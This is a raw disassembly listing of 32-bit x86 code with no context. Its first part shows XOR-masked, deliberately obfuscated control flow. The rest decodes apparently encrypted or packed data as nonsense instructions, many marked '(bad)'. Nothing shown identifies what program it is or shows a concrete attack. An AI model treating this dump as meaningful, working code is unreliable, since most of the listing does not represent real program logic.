  412524:	mov    DWORD PTR [ebp-0x44],ebx
  412527:	mov    edx,DWORD PTR [ebp+0x8]
  41252a:	xor    edx,eax
  41252c:	add    edx,esi
  41252e:	jne    0x4122e9
  412534:	mov    edx,DWORD PTR [ebp-0xc]
  412537:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41253e:	mov    bl,BYTE PTR [ebp-0x1]
  412541:	cmp    dl,bl
  412543:	je     0x412621
  412549:	mov    ecx,DWORD PTR [ebp-0x5c]
  41254c:	mov    edx,DWORD PTR [ebp-0xc]
  41254f:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  412556:	mov    ebx,DWORD PTR [ebp+0xc]
  412559:	xor    ecx,eax
  41255b:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f3]
  412562:	jne    0x414ade
  412568:	mov    ecx,DWORD PTR [ebp-0x5c]
  41256b:	mov    edx,DWORD PTR [ebp+0xc]
  41256e:	xor    ecx,eax
  412570:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f3]
  412578:	mov    edx,DWORD PTR [ebp-0x18]
  41257b:	xor    edx,eax
  41257d:	add    edx,esi
  41257f:	cmp    ecx,edx
  412581:	mov    ecx,DWORD PTR [ebp-0x14]
  412584:	mov    DWORD PTR [ebp+0x8],ecx
  412587:	mov    ecx,DWORD PTR [ebp+0x8]
  41258a:	je     0x41b681
  412590:	xor    ecx,eax
  412592:	add    ecx,esi
  412594:	mov    ecx,0x242ebcd
  412599:	je     0x414a32
  41259f:	mov    edx,DWORD PTR [ebp+0x8]
  4125a2:	mov    ebx,DWORD PTR [ebp-0x8]
  4125a5:	xor    edx,eax
  4125a7:	xor    ebx,eax
  4125a9:	sub    edx,ebx
  4125ab:	sub    edx,esi
  4125ad:	xor    edx,eax
  4125af:	mov    DWORD PTR [ebp+0x8],edx
  4125b2:	mov    edx,DWORD PTR [ebp+0x8]
  4125b5:	mov    ebx,DWORD PTR [ebp-0x58]
  4125b8:	add    edx,0x5708e2
  4125be:	imul   edx,ebx
  4125c1:	mov    DWORD PTR [ebp-0x58],edx
  4125c4:	mov    edx,DWORD PTR [ebp+0x8]
  4125c7:	mov    ebx,DWORD PTR [ebp-0x54]
  4125ca:	add    edx,0x64f89c
  4125d0:	or     edx,ebx
  4125d2:	mov    DWORD PTR [ebp-0x54],edx
  4125d5:	mov    edx,DWORD PTR [ebp+0x8]
  4125d8:	mov    ebx,DWORD PTR [ebp-0x50]
  4125db:	add    edx,ecx
  4125dd:	xor    edx,ebx
  4125df:	mov    DWORD PTR [ebp-0x50],edx
  4125e2:	mov    edx,DWORD PTR [ebp+0x8]
  4125e5:	mov    ebx,DWORD PTR [ebp-0x4c]
  4125e8:	add    edx,edi
  4125ea:	and    edx,ebx
  4125ec:	mov    DWORD PTR [ebp-0x4c],edx
  4125ef:	mov    edx,DWORD PTR [ebp+0x8]
  4125f2:	mov    ebx,DWORD PTR [ebp-0x48]
  4125f5:	lea    edx,[ebx+edx*1+0x241fcdf]
  4125fc:	mov    DWORD PTR [ebp-0x48],edx
  4125ff:	mov    edx,DWORD PTR [ebp+0x8]
  412602:	mov    ebx,0xfa5e1528
  412607:	sub    ebx,edx
  412609:	add    ebx,DWORD PTR [ebp-0x44]
  41260c:	mov    DWORD PTR [ebp-0x44],ebx
  41260f:	mov    edx,DWORD PTR [ebp+0x8]
  412612:	xor    edx,eax
  412614:	add    edx,esi
  412616:	jne    0x41259f
  41261c:	jmp    0x414a32
  412621:	mov    edx,DWORD PTR [ebp-0x14]
  412624:	jmp    0x4149ad
  412629:	rcr    ah,1
  41262b:	sbb    eax,DWORD PTR [edx+0x17]
  41262e:	mov    ah,0xd0
  412630:	nop
  412631:	cs aam 0x99
  412634:	or     BYTE PTR [esi],al
  412636:	xor    al,BYTE PTR [edi-0x43]
  412639:	imul   ecx,DWORD PTR [edx+0x5c178383],0xffffff83
  412640:	xor    esi,0x67
  412643:	xchg   esi,eax
  412644:	or     eax,0x97dbcf72
  412649:	ret    0xa24e
  41264c:	xlat   BYTE PTR ds:[ebx]
  41264d:	fs add ecx,0x6560aff7
  412654:	fwait
  412655:	jmp    0x412631
  412657:	push   ecx
  412658:	push   es
  412659:	sar    DWORD PTR [edi+0xd],0x3c
  41265d:	cmp    BYTE PTR [esi+0x49],0x6e
  412661:	push   0xb92f63bb
  412666:	add    eax,0xff8e4d1a
  41266b:	push   edx
  41266c:	aas    
  41266d:	stc    
  41266e:	aaa    
  41266f:	push   edi
  412670:	in     eax,0xff
  412672:	sbb    BYTE PTR [eax-0x6],ah
  412675:	ja     0x41265e
  412677:	push   ebx
  412678:	fisttp WORD PTR [esi-0x16]
  41267b:	fist   DWORD PTR [edx]
  41267d:	pop    edx
  41267e:	xor    DWORD PTR [esp+eiz*4+0x4a],eax
  412682:	fs inc edi
  412684:	and    eax,0xd3f4c748
  412689:	imul   eax,DWORD PTR ds:0x58db5b58,0x4bb80eba
  412693:	inc    esi
  412694:	fsub   DWORD PTR [eax]
  412696:	jae    0x412703
  412698:	pusha  
  412699:	imul   BYTE PTR [eax+0xf0336a6]
  41269f:	(bad)  
  4126a0:	rcpps  xmm5,XMMWORD PTR [edi]
  4126a3:	mov    ds:0xaeab7079,eax
  4126a8:	cmp    DWORD PTR [ebx-0x59f85f2d],ebp
  4126ae:	adc    BYTE PTR [esi],bh
  4126b0:	jle    0x4126a7
  4126b2:	lock enter 0xebac,0xae
  4126b7:	xchg   edx,eax
  4126b8:	sbb    ebx,DWORD PTR [edx]
  4126ba:	int3   
  4126bb:	out    0xb1,al
  4126bd:	mov    eax,0xec8ad1a7
  4126c2:	aam    0x45
  4126c4:	gs out 0x6d,eax
  4126c7:	add    al,0xff
  4126c9:	mov    edi,0xe5042224
  4126ce:	popa   
  4126cf:	adc    DWORD PTR [esi-0x3b8e721c],0xffffff9d
  4126d6:	outs   dx,DWORD PTR ds:[esi]
  4126d7:	addr16 jmp 0x41265d
  4126da:	test   ah,dh
  4126dc:	cdq    
  4126dd:	int    0x47
  4126df:	or     eax,0x9eba64af
  4126e4:	mov    ecx,0xbfda7d61
  4126e9:	gs dec edi
  4126eb:	dec    ebp
  4126ec:	adc    eax,0xd98aa0cb
  4126f1:	mov    edx,0x8c871267
  4126f6:	mov    ds:0x48e6de68,eax
  4126fb:	aas    
  4126fc:	or     eax,0x50c1d8e7
  412701:	or     ch,BYTE PTR [ebp+0x59d503c9]
  412707:	lock stos BYTE PTR es:[edi],al
  412709:	xor    edi,esp
  41270b:	fstp   QWORD PTR [ebx+eiz*4-0x47]
  41270f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412710:	pusha  
  412711:	mov    ds:0xcd6bb67b,eax
  412716:	xchg   BYTE PTR [esp+edi*1+0x5d28ba9b],bh
  41271d:	hlt    
  41271e:	lods   al,BYTE PTR ds:[esi]
  41271f:	mov    eax,ds:0x1b671970
  412724:	cli    
  412725:	mov    dl,0x57
  412727:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412728:	or     ebp,esp
  41272a:	mov    ds:0x3521c281,eax
  41272f:	xchg   esi,eax
  412730:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412731:	mov    ch,0x84
  412733:	sbb    eax,0xe3d1a053
  412738:	mov    al,ds:0xbb3b818a
  41273d:	sbb    bl,BYTE PTR [ebx]
  41273f:	je     0x412760
  412741:	test   eax,0x3f028064
  412746:	test   DWORD PTR [ebx],ebp
  412748:	rcl    DWORD PTR [ecx-0x46],0x77
  41274c:	pop    esi
  41274d:	push   ds
  41274e:	daa    
  41274f:	(bad)  
  412750:	mov    esp,0x90902305
  412755:	retf   0x8efb
  412758:	inc    ebx
  412759:	lahf   
  41275a:	fimul  WORD PTR [ecx]
  41275c:	ins    BYTE PTR es:[edi],dx
  41275d:	lahf   
  41275e:	(bad)  
  41275f:	clc    
  412760:	sbb    DWORD PTR [esi+edx*4],ebp
  412763:	mov    ah,0xff
  412765:	pushf  
  412766:	fcomp  st(1)
  412768:	jb     0x412746
  41276a:	test   al,0x6e
  41276c:	fcmovu st,st(1)
  41276e:	push   esp
  41276f:	lahf   
  412770:	sub    DWORD PTR [eax+0x66],eax
  412773:	inc    edx
  412774:	sub    BYTE PTR [edx+esi*1],bl
  412777:	adc    eax,0xf386acb3
  41277c:	push   ecx
  41277d:	pushf  
  41277e:	aad    0xdb
  412780:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412781:	lock out dx,al
  412783:	lock xchg edi,eax
  412785:	dec    ecx
  412786:	shl    BYTE PTR [ecx],0xf
  412789:	aad    0xbe
  41278b:	shr    DWORD PTR [ebx],cl
  41278d:	aaa    
  41278e:	adc    eax,0x678909d4
  412793:	inc    esi
  412794:	(bad)  
  412795:	mov    edi,0x26fb5e17
  41279a:	nop
  41279b:	das    
  41279c:	aaa    
  41279d:	nop
  41279e:	imul   edx,DWORD PTR [edx+0x1a],0x50
  4127a2:	stc    
  4127a3:	xor    cl,ah
  4127a5:	xchg   esp,eax
  4127a6:	repnz inc ebx
  4127a8:	sti    
  4127a9:	pop    esp
  4127aa:	lds    ebx,FWORD PTR [ebx-0x68]
  4127ad:	mov    bh,0x33
  4127af:	and    eax,0xf4facf35
  4127b4:	or     ah,dl
  4127b6:	push   esp
  4127b7:	mov    ah,0x38
  4127b9:	xchg   DWORD PTR [edi*8+0x2287d76c],eax
  4127c0:	int    0xd3
  4127c2:	(bad)  
  4127c3:	push   ebp
  4127c4:	es pop edx
  4127c6:	ud1    edx,ebp
  4127c9:	das    
  4127ca:	pop    eax
  4127cb:	jno    0x4127df
  4127cd:	leave  
  4127ce:	push   esi
  4127cf:	jb     0x412761
  4127d1:	(bad)  
  4127d3:	push   0xffffffdf
  4127d5:	mov    eax,0xf6ef27ae
  4127da:	xchg   edi,eax
  4127db:	adc    DWORD PTR [ebx+0x388db87d],eax
  4127e1:	xchg   BYTE PTR [edx-0x7e9d525d],dl
  4127e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127e8:	pop    esi
  4127e9:	mov    bh,0x1a
  4127eb:	clc    
  4127ec:	test   BYTE PTR [edx],bh
  4127ee:	loop   0x412855
  4127f0:	dec    esi
  4127f1:	inc    ecx
  4127f2:	(bad)  
  4127f3:	mov    edx,0x2600fb0d
  4127f8:	mov    bl,BYTE PTR [edi+0x1c79aeb7]
  4127fe:	add    cl,bh
  412800:	inc    esp
  412801:	jo     0x4127ce
  412803:	(bad)  
  412805:	fsubr  QWORD PTR [esp+eax*1+0xa]
  412809:	mov    eax,0xa47d60ea
  41280e:	imul   edi,DWORD PTR [esi-0x9107871],0xffffffa1
  412815:	in     eax,dx
  412816:	add    eax,0x69fbaf17
  41281b:	mov    WORD PTR [eax],ds
  41281d:	jecxz  0x412844
  41281f:	xor    bh,BYTE PTR [eax]
  412821:	fild   DWORD PTR [eax-0x216ce42f]
  412827:	stos   BYTE PTR es:[edi],al
  412828:	inc    edi
  412829:	leave  
  41282a:	fldcw  WORD PTR [ebx]
  41282c:	fiadd  WORD PTR [edx]
  41282e:	test   DWORD PTR [edx],esp
  412830:	lods   al,BYTE PTR ds:[esi]
  412831:	inc    esi
  412832:	sbb    ch,BYTE PTR [ebp+0x59]
  412835:	xlat   BYTE PTR ds:[ebx]
  412836:	call   0x666954eb
  41283b:	out    0x22,al
  41283d:	or     eax,0x72484bc0
  412842:	outs   dx,BYTE PTR ds:[esi]
  412843:	push   ss
  412844:	jp     0x4127f8
  412846:	mov    cl,0x39
  412848:	es adc edi,edx
  41284b:	fucom  st(4)
  41284d:	pop    ss
  41284e:	aad    0xe4
  412850:	rol    bh,1
  412852:	inc    ebx
  412853:	je     0x412828
  412855:	dec    ebp
  412856:	mov    WORD PTR [edx+0x667e5d77],fs
  41285c:	scas   eax,DWORD PTR es:[edi]
  41285d:	lods   eax,DWORD PTR gs:[esi]
  41285f:	mov    gs,WORD PTR [esi-0x3abb234f]
  412865:	hlt    
  412866:	inc    ecx
  412867:	jne    0x412853
  412869:	jo     0x412897
  41286b:	fld    QWORD PTR [eax+0x4f]
  41286e:	outs   dx,DWORD PTR ds:[esi]
  41286f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412870:	jmp    0x28a4:0xbc2e78b6
  412877:	mov    ds:0xf0fe520a,eax
  41287c:	cwde   
  41287d:	outs   dx,BYTE PTR gs:[esi]
  41287f:	sbb    BYTE PTR [edx+ecx*1-0x9771224],ch
  412886:	or     BYTE PTR [ecx],ah
  412888:	repnz retf 
  41288a:	mov    dh,0xee
  41288c:	sar    edx,1
  41288e:	stos   DWORD PTR es:[edi],eax
  41288f:	std    
  412890:	loopne 0x4128ee
  412892:	les    edi,FWORD PTR [edx-0x1278138d]
  412898:	(bad)  
  412899:	mov    cl,0x48
  41289b:	inc    ebp
  41289c:	mov    ds:0xb1410f37,eax
  4128a1:	cmp    cl,ch
  4128a3:	nop
  4128a4:	(bad)  
  4128a5:	sbb    dh,BYTE PTR [esi]
  4128a7:	add    dh,BYTE PTR [eax+0x2603a971]
  4128ad:	jl     0x41284c
  4128af:	outs   dx,BYTE PTR ds:[esi]
  4128b0:	je     0x41289e
  4128b2:	cmp    DWORD PTR [ebp+0x391f84e5],edx
  4128b8:	xor    ah,BYTE PTR [ebp+0x4dc0acee]
  4128be:	stos   WORD PTR es:[edi],ax
  4128c0:	add    BYTE PTR [edx+0x3b],dh
  4128c3:	fstp   QWORD PTR [eax+0x36]
  4128c6:	sub    ecx,DWORD PTR [ebx]
  4128c8:	cs fwait
  4128ca:	pop    esp
  4128cb:	popa   
  4128cc:	pop    esp
  4128cd:	sbb    ecx,ebx
  4128cf:	stc    
  4128d0:	sahf   
  4128d1:	and    edx,DWORD PTR [edi]
  4128d3:	lea    edi,[esi+0x5cd745fc]
  4128d9:	adc    DWORD PTR [edi+0x58],0xfffffffc
  4128dd:	iret   
  4128de:	scas   eax,DWORD PTR es:[edi]
  4128df:	sub    DWORD PTR ds:0x61c27569,edx
  4128e5:	pop    ds
  4128e6:	mov    ebp,0x9fb6f24
  4128eb:	push   0xb
  4128ed:	add    ecx,eax
  4128ef:	cmp    BYTE PTR [esi-0x9],dh
  4128f2:	ins    BYTE PTR es:[edi],dx
  4128f3:	mov    dh,0x8d
  4128f5:	arpl   WORD PTR [edi],cx
  4128f7:	scas   eax,DWORD PTR es:[edi]
  4128f8:	mov    edx,0x1fb1e39d
  4128fd:	test   eax,ebp
  4128ff:	in     eax,0xc2
  412901:	mov    BYTE PTR [eax],0xbc
  412904:	leave  
  412905:	loop   0x4128af
  412907:	mov    al,0x65
  412909:	push   ebp
  41290a:	push   ebx
  41290b:	test   BYTE PTR [edx-0x10],dl
  41290e:	sub    DWORD PTR [esp+ebx*2],edi
  412911:	sub    ch,BYTE PTR [esi]
  412913:	cmp    al,0x58
  412915:	repz pop ds
  412917:	add    al,0xed
  412919:	push   ebp
  41291a:	and    eax,0x3ada9e68
  41291f:	es loopne 0x41290d
  412922:	mov    ds:0x22812779,eax
  412927:	daa    
  412928:	ja     0x41293b
  41292a:	rcr    DWORD PTR [esi+0x23d60e97],cl
  412930:	jnp    0x4128b7
  412932:	scas   al,BYTE PTR es:[edi]
  412933:	mov    esp,0x4823d1b2
  412938:	addr16 sub ah,0x70
  41293c:	sub    eax,0x48bf6f5e
  412941:	(bad)  
  412943:	mov    bh,0x5d
  412945:	mov    ch,0x8b
  412947:	mov    ecx,0x3a6a3dbe
  41294c:	ss aad 0xaa
  41294f:	mov    ah,dh
  412951:	dec    eax
  412952:	pop    DWORD PTR cs:[ebx]
  412955:	shl    cl,0x22
  412958:	sub    ch,BYTE PTR [edi-0x4437c502]
  41295e:	jbe    0x4129c4
  412960:	xor    al,0x9
  412962:	cmp    eax,0xf1656bdc
  412967:	mov    ebp,0x7e6b4ab7
  41296c:	rcr    DWORD PTR [esi],cl
  41296e:	push   esp
  41296f:	popf   
  412970:	in     eax,dx
  412971:	loopne 0x41293c
  412973:	stos   BYTE PTR es:[edi],al
  412974:	inc    ecx
  412975:	pop    ebp
  412976:	in     eax,0x97
  412978:	push   0xfffffffa
  41297a:	ret    
  41297b:	(bad)  
  41297c:	rol    BYTE PTR [ebp+0x504d35b5],cl
  412982:	sub    edi,DWORD PTR [ecx+0x6d]
  412985:	jo     0x412951
  412987:	xor    bl,cl
  412989:	ins    DWORD PTR es:[edi],dx
  41298a:	push   ebp
  41298b:	(bad)  
  41298c:	push   eax
  41298d:	and    DWORD PTR [eax+eax*4+0x4f],esp
  412991:	gs out dx,eax
  412993:	aaa    
  412994:	in     al,dx
  412995:	ud0    ebx,DWORD PTR [esp+edi*8-0x1f680313]
  41299d:	mov    ebx,0x65f4f93b
  4129a2:	fwait
  4129a3:	jo     0x412943
  4129a5:	cli    
  4129a6:	inc    eax
  4129a7:	push   esp
  4129a8:	add    DWORD PTR [eax-0x3f60c0ee],ebp
  4129ae:	adc    eax,0xf5725a62
  4129b3:	pushf  
  4129b4:	aas    
  4129b5:	push   0x93611a8c
  4129ba:	shr    BYTE PTR es:[ebp-0x62],cl
  4129be:	adc    DWORD PTR [ebx+0x41],esp
  4129c1:	jecxz  0x412981
  4129c3:	or     DWORD PTR [ebp+0x38],edi
  4129c6:	shl    dl,cl
  4129c8:	inc    edx
  4129c9:	popa   
  4129ca:	outs   dx,DWORD PTR ds:[esi]
  4129cb:	push   cs
  4129cc:	dec    esi
  4129cd:	stos   DWORD PTR es:[edi],eax
  4129ce:	gs pop edx
  4129d0:	ins    BYTE PTR es:[edi],dx
  4129d1:	(bad)  
  4129d2:	rol    ecx,1
  4129d4:	jb     0x412a17
  4129d6:	ret    0x62e3
  4129d9:	lea    edx,[ebx+0x11]
  4129dc:	fadd   DWORD PTR [edi-0x19]
  4129df:	arpl   WORD PTR [ebp+0x4e],cx
  4129e2:	mov    edi,0x5b73b678
  4129e7:	pop    ecx
  4129e8:	xlat   BYTE PTR ds:[ebx]
  4129e9:	adc    dl,dh
  4129eb:	jg     0x412a5a
  4129ed:	cmp    BYTE PTR [esi+0x7a],bl
  4129f0:	in     eax,0x5
  4129f2:	cmp    eax,0xe380170
  4129f7:	sub    dh,BYTE PTR [esi]
  4129f9:	jmp    0x48fa:0x20a5276e
  412a00:	pop    ebx
  412a01:	pop    ss
  412a02:	mov    eax,0x95070b6c
  412a07:	mov    ah,BYTE PTR ds:0xabea5a1d
  412a0d:	cld    
  412a0e:	jg     0x412a22
  412a10:	push   ecx
  412a11:	rcl    BYTE PTR [edx+0x51],0x22
  412a15:	dec    edi
  412a16:	mov    WORD PTR [edi],es
  412a18:	clc    
  412a19:	adc    eax,0x45bc3cfc
  412a1e:	(bad)  
  412a1f:	push   esi
  412a20:	add    BYTE PTR [edx+0x5d],bl
  412a23:	out    dx,al
  412a24:	aas    
  412a25:	push   0xbe091ea8
  412a2a:	inc    esi
  412a2b:	pop    ss
  412a2c:	pop    edi
  412a2d:	fbstp  TBYTE PTR [edi-0x25]
  412a30:	(bad)  
  412a31:	fstp   QWORD PTR [ebx+esi*8+0x3e]
  412a35:	cdq    
  412a36:	mov    dh,0x32
  412a38:	mov    cl,0xaf
  412a3a:	int    0x42
  412a3c:	jle    0x4129dc
  412a3e:	mov    dh,BYTE PTR [edi-0x307dce0b]
  412a44:	fst    QWORD PTR [ebx-0x6c]
  412a47:	pop    esi
  412a48:	xor    BYTE PTR [ecx],dh
  412a4a:	mov    cl,0x59
  412a4c:	and    ch,BYTE PTR [esi-0x6d7ec393]
  412a52:	pop    esi
  412a53:	ss stos BYTE PTR es:[edi],al
  412a55:	inc    edx
  412a56:	add    dh,BYTE PTR [edx+0x765f1438]
  412a5c:	dec    ebx
  412a5d:	xor    eax,0xb24cfe62
  412a62:	stos   BYTE PTR es:[edi],al
  412a63:	push   ds
  412a64:	leave  
  412a65:	jle    0x412ae0
  412a67:	lahf   
  412a68:	cmc    
  412a69:	mov    esi,0xea82daba
  412a6e:	mov    cl,0xb3
  412a70:	cmp    DWORD PTR [eax+0x32],esi
  412a73:	xchg   DWORD PTR [edx-0x1ecadac0],ebx
  412a79:	mov    cl,dl
  412a7b:	mov    ebp,0xc359ca58
  412a80:	lea    ebp,[ecx+0x17]
  412a83:	add    ah,cl
  412a85:	jl     0x412a45
  412a87:	mov    dl,0xda
  412a89:	sti    
  412a8a:	loopne 0x412a81
  412a8c:	push   ecx
  412a8d:	pusha  
  412a8e:	mov    BYTE PTR [edi-0x34690d77],dl
  412a94:	inc    edx
  412a95:	mov    al,0xc3
  412a97:	popa   
  412a98:	cmp    BYTE PTR [edi+ebx*2-0x6e3c479d],bh
  412a9f:	pop    esi
  412aa0:	xor    DWORD PTR [edi-0x7d],esi
  412aa3:	cli    
  412aa4:	movaps XMMWORD PTR [ecx+0x66],xmm0
  412aa8:	pop    ss
  412aa9:	mov    eax,0xf61413a4
  412aae:	ins    BYTE PTR es:[edi],dx
  412aaf:	cli    
  412ab0:	popa   
  412ab1:	hlt    
  412ab2:	fs ja  0x412ad2
  412ab5:	pop    ds
  412ab6:	repnz jecxz 0x412a82
  412ab9:	pop    edx
  412aba:	test   dl,ah
  412abc:	push   es
  412abd:	lods   al,BYTE PTR ds:[esi]
  412abe:	rol    DWORD PTR [esi-0x10],1
  412ac1:	in     al,dx
  412ac2:	ins    DWORD PTR es:[edi],dx
  412ac3:	pushf  
  412ac4:	push   0xffffff97
  412ac6:	xor    DWORD PTR [ebp+0x3bdc7966],eax
  412acc:	inc    edi
  412acd:	retf   
  412ace:	cmp    edx,DWORD PTR [ebp-0xf]
  412ad1:	(bad)  
  412ad2:	dec    eax
  412ad3:	aas    
  412ad4:	push   ds
  412ad5:	arpl   WORD PTR [esi],bp
  412ad7:	adc    ah,BYTE PTR [ebx]
  412ad9:	xor    al,0xbe
  412adb:	add    BYTE PTR [esi],dh
  412add:	adc    al,0x27
  412adf:	jnp    0x412a74
  412ae1:	jno    0x412a99
  412ae3:	ffree  st(6)
  412ae5:	cmp    esp,edx
  412ae7:	in     al,0xf2
  412ae9:	and    bl,ah
  412aeb:	fdivr  DWORD PTR [esi-0x23371003]
  412af1:	jg     0x412b66
  412af3:	jecxz  0x412b1b
  412af5:	cmp    eax,edx
  412af7:	in     eax,0xef
  412af9:	push   esi
  412afa:	cs dec ebp
  412afc:	adc    al,BYTE PTR [eax+0x6b]
  412aff:	mov    ah,0xa0
  412b01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b02:	rcr    DWORD PTR [ebx],cl
  412b04:	lods   al,BYTE PTR ds:[esi]
  412b05:	(bad)  
  412b06:	push   esp
  412b07:	adc    BYTE PTR [edi-0x657f4c7b],al
  412b0d:	dec    ecx
  412b0e:	mov    BYTE PTR [esi],0xbe
  412b11:	fld    DWORD PTR [ecx]
  412b13:	cmp    bl,ah
  412b15:	call   0x62ae52e2
  412b1a:	mov    eax,0xfcebef4d
  412b1f:	in     eax,dx
  412b20:	xor    edx,DWORD PTR [ecx+0x14]
  412b23:	jle    0x412b9b
  412b25:	mov    eax,ds:0x3e5c6992
  412b2a:	mov    cl,0x9c
  412b2c:	ror    BYTE PTR [edx+0x25],0x85
  412b30:	enter  0xd52a,0x9a
  412b34:	arpl   WORD PTR [esi],sp
  412b36:	shl    ecx,0x62
  412b39:	xor    BYTE PTR [edx-0x5e443bd9],0x1a
  412b40:	mov    ebx,DWORD PTR [ebp-0xf64ef38]
  412b46:	neg    DWORD PTR [esp+ebx*8+0x5a]
  412b4a:	scas   al,BYTE PTR es:[edi]
  412b4b:	dec    edx
  412b4c:	ret    0x3718
  412b4f:	ret    0x398e
  412b52:	ror    DWORD PTR [ecx],1
  412b54:	jge    0x412b52
  412b56:	mov    cl,0x5e
  412b58:	pushf  
  412b59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b5a:	inc    ebx
  412b5b:	stos   BYTE PTR es:[edi],al
  412b5c:	lods   eax,DWORD PTR ds:[esi]
  412b5d:	imul   esp,DWORD PTR [edx-0x76e5f57b],0xbc976db3
  412b67:	mov    cl,0x17
  412b69:	hlt    
  412b6a:	fadd   DWORD PTR [esi]
  412b6c:	and    dl,BYTE PTR [esi-0x4c]
  412b6f:	cmp    eax,0x57e680da
  412b74:	xor    ecx,DWORD PTR [ecx]
  412b76:	xor    ch,dh
  412b78:	cld    
  412b79:	and    edx,ebp
  412b7b:	enter  0x4982,0xfe
  412b7f:	mov    eax,0xb6738855
  412b84:	push   edi
  412b85:	jmp    0x412b5c
  412b87:	mov    ds:0x9e9ac717,eax
  412b8c:	outs   dx,BYTE PTR ds:[esi]
  412b8d:	mov    ds:0x2c4f9de3,eax
  412b92:	stos   DWORD PTR es:[edi],eax
  412b93:	into   
  412b94:	ss jno 0x412b4f
  412b97:	mov    ebx,cs
  412b99:	xor    al,0x92
  412b9b:	jno    0x412bc0
  412b9d:	test   BYTE PTR [eax],0x69
  412ba0:	(bad)  
  412ba1:	fdiv   st(2),st
  412ba3:	iret   
  412ba4:	out    dx,eax
  412ba5:	sti    
  412ba6:	adc    al,0x4c
  412ba8:	out    dx,al
  412ba9:	dec    esi
  412baa:	adc    dl,BYTE PTR [esi]
  412bac:	fadd   DWORD PTR [esi]
  412bae:	or     eax,0x62735159
  412bb3:	inc    eax
  412bb4:	adc    eax,0x2feb9d32
  412bb9:	jl     0x412b53
  412bbb:	inc    eax
  412bbc:	jg     0x412c22
  412bbe:	add    al,ch
  412bc0:	push   edi
  412bc1:	pop    edx
  412bc2:	mov    ebx,0x2a8f56f6
  412bc7:	test   al,0xda
  412bc9:	push   eax
  412bca:	push   edi
  412bcb:	out    dx,eax
  412bcc:	mov    ah,0x7e
  412bce:	xor    edx,edx
  412bd0:	push   ebp
  412bd1:	xlat   BYTE PTR ds:[ebx]
  412bd2:	repnz mov ds:0xf6f7739b,al
  412bd8:	call   0x537b1ab
  412bdd:	gs xchg ecx,eax
  412bdf:	mov    BYTE PTR [ecx],cl
  412be1:	pop    ebx
  412be2:	stos   DWORD PTR es:[edi],eax
  412be3:	dec    eax
  412be4:	call   0x3926:0xf75066d
  412beb:	cld    
  412bec:	adc    DWORD PTR [ebx+0x58945c20],esi
  412bf2:	dec    ebx
  412bf3:	test   DWORD PTR [edx-0x489e0d81],ecx
  412bf9:	mov    cl,0x5b
  412bfb:	popf   
  412bfc:	mov    dh,0xdf
  412bfe:	(bad)  
  412bff:	and    al,0x7d
  412c01:	cwde   
  412c02:	test   BYTE PTR [ebp-0x72],al
  412c05:	sbb    esp,edi
  412c07:	add    eax,0xd8b2fff2
  412c0c:	ins    BYTE PTR es:[edi],dx
  412c0d:	sub    dh,cl
  412c0f:	loop   0x412bc4
  412c11:	in     eax,dx
  412c12:	mov    ebp,DWORD PTR [ebp+0x1eccedcf]
  412c18:	cmp    al,BYTE PTR [eax-0x80]
  412c1b:	sub    dl,BYTE PTR [eax-0x7e87d10b]
  412c21:	add    ebp,DWORD PTR [ecx]
  412c23:	repnz add DWORD PTR [esi-0x18b9d429],ecx
  412c2a:	test   al,0xe1
  412c2c:	push   ebp
  412c2d:	fild   WORD PTR ds:0x769a5619
  412c33:	push   es
  412c34:	push   0x1e93bf29
  412c39:	imul   edx,eax,0x77
  412c3c:	rol    DWORD PTR [eax+0x61596122],1
  412c42:	test   al,0xa4
  412c44:	ffreep st(5)
  412c46:	pop    ss
  412c47:	ss je  0x412c44
  412c4a:	jl     0x412bf7
  412c4c:	sbb    BYTE PTR [edi],dh
  412c4e:	inc    edx
  412c4f:	out    dx,al
  412c50:	push   0x50
  412c52:	jge    0x412c5d
  412c54:	cmp    DWORD PTR [edi+0x7e1c3188],0xffffffba
  412c5b:	aam    0xc2
  412c5d:	sub    BYTE PTR [ebx],ch
  412c5f:	dec    edi
  412c60:	ss jg  0x412c2d
  412c63:	or     BYTE PTR [ebx],ch
  412c65:	xor    BYTE PTR ds:0xcea5fd16,ah
  412c6b:	mov    cs,WORD PTR cs:[edi]
  412c6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c6f:	dec    ebx
  412c70:	cmp    BYTE PTR [ebx-0x70],ah
  412c73:	jae    0x412c13
  412c75:	sar    DWORD PTR [eax+0x5a],cl
  412c78:	jecxz  0x412cdb
  412c7a:	sbb    BYTE PTR ds:0xe0bca324,ah
  412c80:	push   ebx
  412c81:	sbb    cl,BYTE PTR [ecx+0x3b]
  412c84:	pop    esp
  412c85:	mov    dh,0xf9
  412c87:	ror    esp,0x8c
  412c8a:	loopne 0x412c0d
  412c8c:	jp     0x412cd5
  412c8e:	loope  0x412c98
  412c90:	(bad)  
  412c91:	xor    ah,ch
  412c93:	inc    esp
  412c94:	rcr    BYTE PTR [ecx-0x12c729a3],1
  412c9a:	pushf  
  412c9b:	jle    0x412c93
  412c9d:	sub    BYTE PTR [ebp-0x35],cl
  412ca0:	ss dec edx
  412ca2:	(bad)  
  412ca3:	iret   
  412ca4:	(bad)  
  412ca5:	mov    edi,0xd8eaeb78
  412caa:	inc    esp
  412cab:	jle    0x412cdf
  412cad:	jl     0x412ca8
  412caf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cb0:	dec    esp
  412cb1:	or     ch,bh
  412cb3:	push   cs
  412cb4:	jmp    0x412cfe
  412cb6:	jle    0x412cd7
  412cb8:	inc    eax
  412cb9:	sbb    al,BYTE PTR ds:0x62f1d6f3
  412cbf:	in     eax,0x4
  412cc1:	loopne 0x412cfd
  412cc3:	mov    ch,0x36
  412cc5:	pop    ebx
  412cc6:	push   0xe1d16b52
  412ccb:	and    esp,eax
  412ccd:	loope  0x412d08
  412ccf:	dec    ecx
  412cd0:	push   esi
  412cd1:	mov    esi,0xff1bb251
  412cd6:	mov    edi,0x64f5da98
